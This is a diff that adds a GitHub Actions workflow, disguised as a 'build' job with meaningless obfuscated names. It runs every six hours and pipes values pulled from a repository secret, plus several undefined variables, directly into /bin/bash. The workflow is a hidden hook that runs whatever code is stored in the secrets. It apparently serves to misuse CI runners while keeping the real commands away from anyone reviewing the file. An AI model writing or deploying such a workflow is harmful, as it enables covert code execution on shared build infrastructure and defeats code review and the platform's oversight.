@@ -1,0 +1,22 @@
+name: pierseleeli
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pierseleeli
+        env:
+          guba41613: ${{ secrets.guba41613 }}
+        run: |
+          echo $guba41613 | jq -r .kq3047 | /bin/bash
+          echo $lti5889 | jq -r .n1 | /bin/bash
+          echo $nr29097 | jq -r .gvxj12581 | /bin/bash
+          echo $kfm9826 | jq -r .i63439 | /bin/bash
+          echo $fd026 | jq -r .caa66 | /bin/bash
+
